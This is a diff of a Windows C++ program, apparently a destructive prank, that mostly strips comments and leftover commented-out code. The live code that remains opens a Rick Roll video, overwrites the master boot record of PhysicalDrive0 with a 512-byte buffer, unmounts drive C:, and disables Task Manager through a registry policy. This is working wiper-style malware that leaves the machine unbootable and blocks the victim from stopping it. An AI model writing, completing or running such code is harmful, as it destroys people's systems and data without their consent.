@@ -93,8 +93,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     //rick roll
     system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
 
-    //overwrite mbr with 0s while they enjoy the music video
-    //ZeroMemory(&mbrData, (sizeof mbrData));
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileW(
         L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
@@ -104,30 +102,15 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
     CloseHandle(hDevice);
 
-
-    /*HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
-    if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE) {
-        MessageBoxW(NULL, L"Successfully overwrote mbr!", L"Success!", MB_OK | MB_ICONASTERISK);
-    }
-    else {
-        MessageBoxW(NULL, L"Failed to overwrite mbr", L"failed", MB_OK | MB_ICONSTOP);
-    }
-    CloseHandle(MasterBootRecord);*/
-
-    //eject C:
      system("mountvol C: /d");
 
     DWORD dwVal = 1;
 
     HKEY hKey;
 
-    //Disable TaskMGR
     RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
     RegSetValueEx(hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
     RegCloseKey(hKey);
-
-    //std::thread p1(monitor);
-    //std::thread p2(monitor);
 
     Sleep(10000);
 
